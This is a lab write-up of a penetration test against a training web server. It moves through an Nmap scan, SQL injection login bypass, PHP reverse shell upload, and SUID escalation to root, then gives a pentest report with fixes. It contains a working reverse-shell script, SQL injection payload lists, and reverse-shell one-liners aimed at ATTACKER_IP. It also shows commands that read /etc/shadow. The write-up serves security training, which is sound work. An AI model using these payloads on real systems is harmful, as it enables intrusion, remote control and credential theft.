# Lab 13: Penetration Testing & Ethical Hacking

## 📋 Lab Overview
  
**Difficulty Level:** Expert  

### Objective
This lab demonstrates offensive security capabilities by conducting a full penetration test from reconnaissance through privilege escalation, exploiting SQL injection vulnerabilities to gain administrative access, uploading a reverse shell payload, establishing persistent backdoor access, performing Linux privilege escalation via SUID binaries, and achieving root access on the target system. This simulates real-world ethical hacking engagements and demonstrates understanding of both offensive and defensive security.

---

## 🎯 Learning Outcomes

By completing this lab, I demonstrated proficiency in:

- **Reconnaissance:** Network scanning with Nmap to identify targets and open ports
- **Enumeration:** Service discovery and vulnerability identification
- **Web Application Exploitation:** SQL injection to bypass authentication
- **Payload Delivery:** Uploading malicious PHP reverse shell
- **Directory Brute-Forcing:** Using Dirbuster to discover hidden files
- **Reverse Shell Establishment:** Gaining remote command execution with Netcat
- **Privilege Escalation:** Exploiting SUID binaries for root access
- **Attack Chain Execution:** Complete kill chain from recon to full compromise
- **Penetration Testing Reporting:** Professional pentest report with risk ratings
- **Ethical Hacking Principles:** Legal and responsible vulnerability assessment

---

## 🛠️ Tools & Technologies Used

### Offensive Security Toolkit

| Tool | Purpose | Usage |
|------|---------|-------|
| **Kali Linux** | Penetration testing OS | Attack platform with pre-installed security tools |
| **Nmap** | Network scanner | Host discovery, port scanning, service enumeration |
| **Burp Suite** | Web proxy | HTTP request manipulation (optional) |
| **Dirbuster** | Directory brute-forcer | Discover hidden web directories and files |
| **Netcat (nc)** | Network utility | Reverse shell listener |
| **PHP Reverse Shell** | Web shell payload | Remote command execution backdoor |
| **find** | Linux utility | SUID binary enumeration |
| **bash** | Shell | Privilege escalation via SUID |

### Target Environment

| Component | Details |
|-----------|---------|
| **Attacker:** | Kali Linux VM (192.168.13.165) |
| **Target:** | Web server (10.43.32.99:80) |
| **Vulnerable Service:** | HTTP web application with file upload |
| **Operating System:** | Linux (discovered during exploitation) |

---

## 🏗️ Attack Architecture

### Kill Chain Overview

```
[Phase 1: Reconnaissance]
    Kali (192.168.13.165)
           ↓ nmap scan
    Target Network Discovery
           ↓
    Web Server Found (10.43.32.99:80)
           ↓
[Phase 2: Initial Access]
    SQL Injection (' OR '1)
           ↓
    Admin Access Gained
           ↓
    Upload php-reverse-shell.php
           ↓
[Phase 3: Execution]
    Dirbuster → Find uploaded shell
           ↓
    nc -nlvp 80 (listener)
           ↓
    Trigger reverse shell → Remote shell established
           ↓
[Phase 4: Privilege Escalation]
    find / -perm /4000 → Discover SUID binaries
           ↓
    Execute coolbash
           ↓
    ROOT ACCESS ACHIEVED
```

### Network Diagram

```
                    [Attacker]
                   Kali Linux
                 192.168.13.165
                       |
                       | Nmap Scan
                       ↓
                 [ServerNet]
                10.43.32.0/24
                       |
           +-----------+-----------+
           |                       |
      [UbuntuWebServer]      [Target Server]
       10.43.32.7           10.43.32.99
                            Port 80: HTTP
                            (Vulnerable Web App)
                                   |
                            [After Exploitation]
                            Reverse Shell → Kali
                            Root Access Achieved
```

---

## 📝 Penetration Testing Methodology

### Phase 1: Reconnaissance & Scanning

#### Understanding Reconnaissance

**Reconnaissance (Recon):**
The first phase of any penetration test where attackers gather information about the target.

**Types:**
1. **Passive Recon:** Information gathering without directly interacting with target
   - Google dorking
   - Social media research
   - WHOIS lookups
   - DNS enumeration

2. **Active Recon:** Direct interaction with target systems
   - Port scanning (Nmap)
   - Service enumeration
   - Vulnerability scanning

**Legal Consideration:**
Always obtain written authorization before conducting active reconnaissance!

#### Task 1.1: Network Discovery with Nmap

**Command:**
```bash
sudo nmap -p- 10.43.32.99
```

**Flag Breakdown:**
- **-p-**: Scan ALL 65,535 TCP ports (not just common 1,000)
- **sudo**: Required for SYN scan (stealthier than connect scan)

**Output:**
```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.43.32.99
Host is up (0.0012s latency).
Not shown: 65534 closed tcp ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.32 seconds
```

**Analysis:**

| Finding | Significance |
|---------|-------------|
| **Host is up** | Target is reachable and responding |
| **Port 80 open** | Web server running (HTTP) |
| **Service: http** | Likely Apache, Nginx, or IIS |
| **No HTTPS (443)** | Unencrypted traffic (easier to intercept) |
| **Only 1 port open** | Small attack surface (good security practice) |

**Attack Surface Identified:**
- Primary target: Web application on port 80
- Potential vulnerabilities: SQLi, XSS, file upload, directory traversal

#### Task 1.2: Service Version Detection (Advanced)

**Enhanced Nmap Scan:**
```bash
sudo nmap -sV -sC -p80 10.43.32.99
```

**Flags:**
- **-sV**: Version detection
- **-sC**: Run default NSE (Nmap Scripting Engine) scripts

**Example Output:**
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: File Upload Portal
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

**What This Reveals:**
- **Apache 2.4.41**: Check for known CVEs
- **Ubuntu**: Linux target (important for privilege escalation)
- **File Upload Portal**: High-value target for exploitation

---

### Phase 2: Web Application Exploitation

#### Understanding SQL Injection

**SQL Injection (SQLi):**
Vulnerability allowing attackers to inject malicious SQL code into application queries.

**How It Works:**

**Vulnerable Code Example:**
```php
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

**Normal Login:**
```
Username: admin
Password: mypassword

Query: SELECT * FROM users WHERE username='admin' AND password='mypassword'
```

**SQL Injection Attack:**
```
Username: ' OR '1
Password: anything

Query: SELECT * FROM users WHERE username='' OR '1' AND password='anything'
```

**Why This Works:**
```
SELECT * FROM users WHERE username='' OR '1' AND password='anything'
                                        ↑
                                    Always TRUE

Result: Returns all users, including admin
Outcome: Authentication bypassed
```

#### Task 2.1: SQL Injection to Bypass Authentication

**Target:** Login form at http://10.43.32.99:80

**Payload:**
```
Username: ' OR '1
Password: [anything]
```

**Attack Process:**

**Step 1: Identify Injection Point**
- Login form detected
- Username and password fields present
- Test for SQL injection vulnerability

**Step 2: Craft Payload**
```
' OR '1
```

**Breakdown:**
- `'` - Closes the username string
- `OR` - Boolean operator
- `'1'` - Always true condition
- Becomes: `username='' OR '1'` (always TRUE)

**Step 3: Execute Attack**
- Enter payload in username field
- Submit form
- Observe response

**Result:** ✅ **Authentication Bypassed - Admin Access Granted**

**Alternative SQL Injection Payloads:**

| Payload | Purpose |
|---------|---------|
| `' OR 1=1--` | Classic SQLi (-- comments out rest of query) |
| `admin'--` | Login as admin (assumes admin username) |
| `' UNION SELECT NULL--` | UNION-based SQLi (data exfiltration) |
| `' AND SLEEP(5)--` | Time-based blind SQLi (detection) |

**Why Admin Access Matters:**
- File upload functionality unlocked
- Access to sensitive data
- Ability to modify content
- Potential for further exploitation

#### Task 2.2: Uploading Malicious PHP Reverse Shell

**Understanding Reverse Shells:**

**Normal Shell:** Attacker connects TO victim
```
Attacker → [initiates connection] → Victim
```

**Reverse Shell:** Victim connects BACK to attacker
```
Attacker [listening] ← [initiates connection] ← Victim
```

**Why Reverse Shells?**
- Bypasses firewall (outbound connections usually allowed)
- No open ports needed on victim
- Harder to detect than bind shells

**Payload Used:** `php-reverse-shell.php`

**Reverse Shell Code (Modified for Target):**
```php
<?php
set_time_limit(0);
$ip = '192.168.13.165';  // Attacker's Kali IP
$port = 80;               // Listener port
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

**Configuration:**
- **$ip**: Change to attacker IP (192.168.13.165)
- **$port**: Change to listener port (80)

**Upload Process:**

**Step 1: Navigate to Upload Functionality**
```
http://10.43.32.99:80 → Admin Panel → File Upload
```

**Step 2: Select Payload**
```
Browse → Select php-reverse-shell.php → Upload
```

**Step 3: Verify Upload**
```
Upload successful: File saved to /uploads/php-reverse-shell.php
```

**Security Vulnerability Exploited:**
- ❌ No file type validation (accepts .php)
- ❌ No file content scanning (malware check)
- ❌ Uploaded files in web-accessible directory
- ❌ PHP execution enabled in uploads folder

**Secure File Upload Best Practices:**
```
✅ Whitelist allowed extensions (jpg, png, pdf only)
✅ Validate MIME types
✅ Scan with antivirus/malware detector
✅ Store uploads outside webroot
✅ Rename files (prevent direct access)
✅ Disable PHP execution in uploads directory
```

---

### Phase 3: Discovery & Execution

#### Task 3.1: Directory Brute-Forcing with Dirbuster

**What is Dirbuster?**
Tool for brute-forcing web directories and files using wordlists.

**Why Use Dirbuster?**
- Uploaded file path unknown
- Need to find `/uploads/` directory
- Discover hidden admin panels, config files

**Command:**
```bash
dirbuster
```

**Configuration:**
1. **Target URL:** http://10.43.32.99:80
2. **Wordlist:** /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
3. **File Extensions:** php, html, txt
4. **Threads:** 10 (balance speed vs. stealth)

**Scan Results:**
```
Dir found: /uploads/ (Status: 200)
File found: /uploads/php-reverse-shell.php (Status: 200)
Dir found: /admin/ (Status: 403 Forbidden)
File found: /config.php (Status: 200)
```

**Key Findings:**

| Discovery | Risk | Action |
|-----------|------|--------|
| `/uploads/` | Critical | Found reverse shell location |
| `/admin/` | High | Additional attack surface |
| `/config.php` | Critical | May contain DB credentials |

**Alternative: Manual Discovery**
```bash
# curl to test common paths
curl http://10.43.32.99/uploads/
curl http://10.43.32.99/admin/
```

#### Task 3.2: Establishing Reverse Shell with Netcat

**What is Netcat?**
"Swiss Army knife" of networking - can listen on ports, create connections, transfer files.

**Setup Listener (Attacker - Kali):**
```bash
nc -nlvp 80
```

**Flags:**
- **-n**: No DNS resolution (faster)
- **-l**: Listen mode
- **-v**: Verbose output
- **-p 80**: Listen on port 80

**Output:**
```
Listening on 0.0.0.0 80
```

**Trigger Reverse Shell (Victim):**
```bash
# In browser, navigate to:
http://10.43.32.99/uploads/php-reverse-shell.php
```

**What Happens:**
1. PHP script executes on victim server
2. Creates socket connection back to Kali (192.168.13.165:80)
3. Spawns `/bin/sh` shell
4. Redirects stdin/stdout/stderr to socket
5. Attacker receives shell on Kali

**Successful Connection Output:**
```
Connection received on 10.43.32.99 45678
$ whoami
www-data
$ pwd
/var/www/html/uploads
$
```

**Current Access Level:**
- User: `www-data` (Apache web server user)
- Permissions: Limited (cannot access /root, cannot install software)
- Goal: Escalate to `root` user

---

### Phase 4: Privilege Escalation

#### Understanding Linux Privilege Escalation

**Privilege Escalation:**
Process of gaining higher privileges than initially obtained.

**Types:**
1. **Vertical:** Low-privilege → High-privilege (www-data → root)
2. **Horizontal:** User → Another user (alice → bob)

**Common Techniques:**
- SUID binaries exploitation
- Kernel exploits
- Sudo misconfigurations
- Cron job manipulation
- Writable PATH directories

#### Task 4.1: SUID Binary Enumeration

**What is SUID?**
**Set User ID (SUID):** Special Linux permission that allows a file to be executed with the permissions of the file owner (often root).

**Example:**
```bash
-rwsr-xr-x 1 root root 54096 /usr/bin/passwd
 ↑
 s = SUID bit set

When user runs /usr/bin/passwd:
- File owner: root
- SUID bit: set
- Result: passwd runs as root (can modify /etc/shadow)
```

**Why SUID is Dangerous:**
If a SUID binary has vulnerabilities or can execute commands, attacker can run commands as root!

**SUID Enumeration Command:**
```bash
find / -perm /4000 -type f 2>/dev/null
```

**Flag Breakdown:**
- **-perm /4000**: Find files with SUID bit set (4000 = SUID)
- **-type f**: Only files (not directories)
- **2>/dev/null**: Suppress "Permission denied" errors

**Output:**
```
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chsh
/bin/ping
/bin/mount
/home/cooluser/coolbash  ← VULNERABLE!
```

**Analysis:**

| Binary | Owner | Risk | Notes |
|--------|-------|------|-------|
| /usr/bin/passwd | root | ✅ Normal | Expected SUID binary |
| /usr/bin/sudo | root | ✅ Normal | Expected SUID binary |
| **/home/cooluser/coolbash** | **root** | **❌ VULNERABLE** | **Custom binary, should not be SUID!** |

#### Task 4.2: Exploiting SUID Binary (coolbash)

**What is coolbash?**
Custom bash script or binary with SUID bit set and owned by root.

**Exploit:**
```bash
$ find / -perm /4000 -type f 2>/dev/null | grep coolbash
/home/cooluser/coolbash

$ file /home/cooluser/coolbash
/home/cooluser/coolbash: ELF 64-bit LSB executable

$ ls -la /home/cooluser/coolbash
-rwsr-xr-x 1 root root 12345 Dec 1 10:00 /home/cooluser/coolbash
 ↑ SUID bit set, owned by root

$ /home/cooluser/coolbash
# (executes as root due to SUID)

# whoami
root
```

**Why This Works:**
1. coolbash is owned by root
2. SUID bit is set (`s` in permissions)
3. When executed, it runs with root's privileges
4. If coolbash spawns a shell, that shell is also root

**Privilege Escalation Success:**
```bash
$ whoami
www-data  ← Before exploitation

$ /home/cooluser/coolbash
# whoami
root      ← After exploitation - FULL CONTROL
```

#### Task 4.3: Verification of Root Access

**Commands to Verify:**
```bash
# whoami
root

# id
uid=0(root) gid=0(root) groups=0(root)

# cat /etc/shadow
root:$6$xyz...:18900:0:99999:7:::
www-data:*:18900:0:99999:7:::
...
(Can read /etc/shadow - only root can do this)

# ls -la /root
drwx------  5 root root 4096 Dec  1 10:00 .
drwxr-xr-x 18 root root 4096 Nov 15 14:22 ..
-rw-r--r--  1 root root  220 Nov 15 14:22 .bash_logout
...
(Can access /root directory - only root can do this)
```

**Full System Compromise Achieved:** ✅

**What Attacker Can Do with Root:**
- Read all files (including /etc/shadow for password hashes)
- Modify any system file
- Create backdoor accounts
- Install rootkits
- Exfiltrate sensitive data
- Pivot to other systems on network
- Destroy evidence (log deletion)

---

## 🎓 Penetration Testing Report

### 1. Executive Summary

**Test Date:** December 4th, 2024  
**Tester:** Faraz Ahmed  
**Target:** 10.43.32.99 (Web Application)  
**Scope:** Single web server on ServerNet  

**Objective:**
Assess the security posture of the web application and underlying infrastructure by simulating a real-world attack.

**Overall Risk Rating:** 🔴 **CRITICAL**

**Key Findings:**
1. ✅ **Full System Compromise Achieved**
2. ✅ **Root Access Obtained** via privilege escalation
3. ✅ **Multiple Critical Vulnerabilities Identified**

**Summary:**
The penetration test successfully achieved full compromise of the target system. Critical vulnerabilities in the web application (SQL injection, unrestricted file upload) combined with a privilege escalation path (SUID binary) allowed an attacker to gain root access. Immediate remediation is required.

---

### 2. Scope

**In-Scope:**
- Web application at http://10.43.32.99:80
- Operating system of target server
- Network services on 10.43.32.99

**Out-of-Scope:**
- Other systems on ServerNet
- AdminNet systems
- Denial of Service (DoS) attacks
- Social engineering
- Physical security

**Testing Window:**
- Start: December 4th, 2024 at 3:30 PM
- End: December 4th, 2024 at 5:00 PM
- Duration: 1.5 hours

**Authorization:**
Penetration testing was conducted with explicit authorization from network owner for educational purposes.

---

### 3. Methodology

**Framework:** OWASP Testing Guide + PTES (Penetration Testing Execution Standard)

**Phases:**
1. **Reconnaissance:** Network scanning, service enumeration
2. **Vulnerability Assessment:** Identify exploitable weaknesses
3. **Exploitation:** Gain initial access
4. **Post-Exploitation:** Establish persistence, escalate privileges
5. **Reporting:** Document findings and recommendations

---

### 4. Findings

#### Finding 1: SQL Injection Vulnerability

**Severity:** 🔴 **CRITICAL**  
**Likelihood:** High (Trivial to exploit)  
**Impact:** High (Complete authentication bypass)  
**CVSS Score:** 9.8 (Critical)

**Description:**
The web application login form is vulnerable to SQL injection, allowing attackers to bypass authentication without valid credentials.

**Vulnerable Parameter:** `username` field in login form

**Proof of Concept:**
```
URL: http://10.43.32.99/login.php
Payload: ' OR '1
Result: Admin access granted
```

**Impact:**
- Complete authentication bypass
- Access to administrative functions
- Ability to upload malicious files
- Potential database data exfiltration

**Recommendation:**
```php
// FIX: Use prepared statements (parameterized queries)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

**Additional Mitigations:**
- Implement Web Application Firewall (WAF)
- Input validation (whitelist allowed characters)
- Least privilege database user (read-only for login)
- Multi-factor authentication (MFA)

**References:**
- OWASP Top 10 2021: A03 - Injection
- CWE-89: SQL Injection

---

#### Finding 2: Unrestricted File Upload

**Severity:** 🔴 **CRITICAL**  
**Likelihood:** Medium (Requires admin access - obtained via Finding 1)  
**Impact:** High (Remote code execution)  
**CVSS Score:** 9.1 (Critical)

**Description:**
The web application allows uploading of PHP files without validation, leading to remote code execution.

**Vulnerable Endpoint:** `/admin/upload.php`

**Proof of Concept:**
```
1. Gain admin access via SQL injection
2. Upload php-reverse-shell.php
3. Navigate to /uploads/php-reverse-shell.php
4. Reverse shell established
```

**Impact:**
- Remote code execution as www-data user
- Access to web server file system
- Ability to pivot to other systems
- Data exfiltration

**Recommendation:**
```php
// FIX: File upload validation
$allowed_extensions = ['jpg', 'jpeg', 'png', 'pdf'];
$file_ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if (!in_array($file_ext, $allowed_extensions)) {
    die("Invalid file type");
}

// Additional: Store files outside webroot
move_uploaded_file($_FILES['file']['tmp_name'], '/var/uploads/' . $safe_filename);

// Disable PHP execution in uploads directory (.htaccess)
php_flag engine off
```

**Additional Mitigations:**
- Antivirus scanning of uploads
- Rename uploaded files (prevent direct execution)
- Content-Type validation
- File size limits

**References:**
- OWASP Top 10 2021: A04 - Insecure Design
- CWE-434: Unrestricted Upload of File with Dangerous Type

---

#### Finding 3: SUID Binary Privilege Escalation

**Severity:** 🔴 **CRITICAL**  
**Likelihood:** Low (Requires shell access - obtained via Finding 2)  
**Impact:** Critical (Full root compromise)  
**CVSS Score:** 8.8 (High)

**Description:**
A custom binary (`/home/cooluser/coolbash`) has the SUID bit set and is owned by root, allowing privilege escalation to root.

**Vulnerable Binary:** `/home/cooluser/coolbash`

**Proof of Concept:**
```bash
$ find / -perm /4000 -type f 2>/dev/null
/home/cooluser/coolbash

$ ls -la /home/cooluser/coolbash
-rwsr-xr-x 1 root root 12345 Dec 1 10:00 /home/cooluser/coolbash

$ /home/cooluser/coolbash
# whoami
root
```

**Impact:**
- Complete system compromise
- Access to all user data
- Ability to install backdoors
- Persistence mechanisms
- Lateral movement to other systems

**Recommendation:**
```bash
# IMMEDIATE: Remove SUID bit
sudo chmod u-s /home/cooluser/coolbash
sudo chmod 755 /home/cooluser/coolbash

# LONG-TERM: Audit all SUID binaries
find / -perm /4000 -type f 2>/dev/null > suid_audit.txt
# Review each binary - remove unnecessary SUID permissions
```

**Additional Mitigations:**
- Regular security audits of SUID/SGID binaries
- Principle of least privilege (minimize SUID usage)
- Use capabilities instead of SUID where possible
- Implement AppArmor/SELinux to restrict binary behavior

**References:**
- GTFOBins: https://gtfobins.github.io/
- CWE-269: Improper Privilege Management

---

### 5. Risk Summary

| Finding | Severity | Likelihood | Impact | Risk Score |
|---------|----------|-----------|--------|------------|
| **SQL Injection** | Critical | High | High | **15/15** |
| **File Upload RCE** | Critical | Medium | High | **12/15** |
| **SUID Escalation** | Critical | Low | Critical | **12/15** |

**Overall System Risk:** 🔴 **CRITICAL - IMMEDIATE ACTION REQUIRED**

---

### 6. Remediation Priority

**Immediate (0-7 days):**
1. ✅ **Disable file upload functionality** until fixed
2. ✅ **Remove SUID bit** from `/home/cooluser/coolbash`
3. ✅ **Implement WAF** to block SQL injection attempts
4. ✅ **Patch application** with prepared statements

**Short-Term (7-30 days):**
5. ✅ Implement secure file upload validation
6. ✅ Conduct full SUID binary audit
7. ✅ Implement MFA for admin accounts
8. ✅ Deploy intrusion detection (SIEM alerts)

**Long-Term (30-90 days):**
9. ✅ Security code review of entire application
10. ✅ Penetration testing (after fixes implemented)
11. ✅ Security awareness training for developers
12. ✅ Implement secure SDLC processes

---

### 7. Compliance Impact

| Regulation | Violation | Impact |
|------------|-----------|--------|
| **PCI-DSS** | Req 6.5.1: SQL Injection prevention | Non-compliant, cannot process credit cards |
| **HIPAA** | §164.308(a)(1) Risk Analysis | High risk, PHI potentially exposed |
| **GDPR** | Article 32: Security measures | Inadequate, potential €20M fine |

---

## 🎓 Key Takeaways & Skills Demonstrated

### Offensive Security Skills

1. **Reconnaissance & Enumeration**
   - Network scanning with Nmap
   - Port and service discovery
   - Attack surface identification

2. **Web Application Exploitation**
   - SQL injection (authentication bypass)
   - File upload vulnerabilities
   - Web shell deployment

3. **Post-Exploitation**
   - Reverse shell establishment
   - Lateral movement
   - Persistence mechanisms

4. **Privilege Escalation**
   - SUID binary exploitation
   - Linux privilege escalation techniques
   - Root access achievement

5. **Penetration Testing Reporting**
   - Professional pentest report structure
   - Risk ratings (CVSS scores)
   - Executive summary
   - Technical findings
   - Remediation recommendations

### Defensive Security Insights

**Attack Chain Understanding:**
```
Recon → Exploit → Access → Escalate → Persist
```

**How to Defend Each Stage:**
1. **Recon:** Minimize exposed services, hide version numbers
2. **Exploit:** Input validation, secure coding, WAF
3. **Access:** Least privilege, segmentation
4. **Escalate:** SUID audits, kernel patching
5. **Persist:** File integrity monitoring, SIEM alerting

---

## 🔐 Ethical Hacking Principles

### Legal & Ethical Considerations

**Legal Requirements:**
✅ **Written Authorization** - Always obtain before testing  
✅ **Defined Scope** - Only test approved systems  
✅ **No Data Exfiltration** - Don't steal sensitive data  
✅ **Responsible Disclosure** - Report vulnerabilities to owner  
✅ **No Harm** - Avoid DoS, data destruction  

**Ethical Hacking Code:**
- Test only with permission
- Respect privacy and confidentiality
- Provide detailed remediation guidance
- Follow responsible disclosure timelines
- Use knowledge for defense, not attack

**Legal Frameworks:**
- Computer Fraud and Abuse Act (CFAA) - US
- Computer Misuse Act - UK
- EU Cybercrime Directive

**Unauthorized hacking = Federal crime (up to 10 years prison)**

---

## 🚀 Real-World Applications

### Career Roles Demonstrated

**Penetration Tester ($90K-$150K):**
- Conduct authorized security assessments
- Exploit vulnerabilities ethically
- Write professional pentest reports
- Provide remediation guidance

**Red Team Operator ($110K-$180K):**
- Simulate advanced persistent threats (APTs)
- Test detection and response capabilities
- Full-scope adversary emulation
- Covert operations

**Bug Bounty Hunter ($50K-$300K+):**
- Find vulnerabilities in public programs
- Responsible disclosure to companies
- Earn rewards for critical bugs
- Platforms: HackerOne, Bugcrowd, Synack

**Security Consultant ($100K-$160K):**
- Assess client security posture
- Conduct penetration tests
- Provide strategic recommendations
- Implement security controls

---

## 📚 Tools Deep Dive

### Nmap Cheat Sheet

```bash
# Basic scan
nmap 

# Full port scan
nmap -p- 

# Service version detection
nmap -sV 

# OS detection
nmap -O 

# Default scripts + version
nmap -sC -sV 

# Aggressive scan (OS + version + scripts + traceroute)
nmap -A 

# UDP scan
nmap -sU 

# Stealth SYN scan
nmap -sS 

# Save output (all formats)
nmap -oA output_name 
```

### SQL Injection Payloads

```sql
-- Authentication bypass
' OR '1'='1'--
' OR 1=1--
admin'--
' OR 'a'='a

-- UNION-based SQLi
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT username,password FROM users--

-- Time-based blind SQLi
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--

-- Boolean-based blind SQLi
' AND 1=1--
' AND 1=2--
```

### Reverse Shell One-Liners

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Netcat (nc)
nc ATTACKER_IP PORT -e /bin/bash

# Perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

---

## 💡 Lessons Learned

### Technical Insights

1. **Defense-in-Depth Works**
   - Single vulnerability (SQLi) wasn't enough for root
   - Multiple vulnerabilities chained together
   - Each layer should be secured independently

2. **Input Validation is Critical**
   - SQL injection = lack of input validation
   - File upload = lack of content validation
   - Always validate and sanitize user input

3. **Least Privilege Prevents Escalation**
   - SUID binaries = excessive privileges
   - Review all SUID/SGID binaries regularly
   - Use capabilities instead where possible

4. **Web Shells are Powerful**
   - Single uploaded file = full system access
   - File upload is high-value target
   - Disable PHP execution in upload directories

### Professional Practices

1. **Always Get Written Authorization**
   - Verbal permission is not enough
   - Document scope, testing window, rules of engagement
   - Protect yourself legally

2. **Document Everything**
   - Screenshots of each step
   - Commands executed
   - Timestamps
   - Evidence for report

3. **Provide Actionable Recommendations**
   - Don't just say "fix SQL injection"
   - Provide code examples
   - Explain WHY it's vulnerable
   - Show HOW to fix it

---

## 📸 Lab Evidence

All attacks documented in original report:

**Reconnaissance:**
- ✅ Nmap scan results (port 80 discovered)

**Exploitation:**
- ✅ SQL injection payload (' OR '1)
- ✅ Admin access achieved
- ✅ Reverse shell upload

**Post-Exploitation:**
- ✅ Dirbuster scan results
- ✅ Netcat listener (nc -nlvp 80)
- ✅ Reverse shell connection

**Privilege Escalation:**
- ✅ SUID binary discovery (find command)
- ✅ coolbash exploitation
- ✅ Root access verification (whoami, id)

---

## 🏆 Lab Status

**Completion Status:** ✅ Successfully Completed  
**Initial Access:** ✅ SQL injection → Admin  
**Code Execution:** ✅ PHP reverse shell uploaded  
**Reverse Shell:** ✅ Connection established  
**Privilege Escalation:** ✅ Root access achieved  
**Report:** ✅ Professional pentest report delivered  

---

## 🔍 Defensive Recommendations Summary

**Web Application:**
```
✅ Use prepared statements (prevent SQL injection)
✅ Validate file uploads (whitelist extensions, scan content)
✅ Store uploads outside webroot
✅ Disable PHP in upload directories
✅ Implement WAF
✅ Enable MFA for admin accounts
```

**Operating System:**
```
✅ Audit SUID/SGID binaries
✅ Remove unnecessary SUID permissions
✅ Keep system patched
✅ Implement least privilege
✅ Enable SELinux/AppArmor
✅ Deploy HIDS (Host IDS)
```

**Network:**
```
✅ Segment networks (DMZ for web servers)
✅ Deploy IDS/IPS
✅ Monitor outbound connections (detect reverse shells)
✅ Implement SIEM alerting
✅ Regular vulnerability scanning
```

---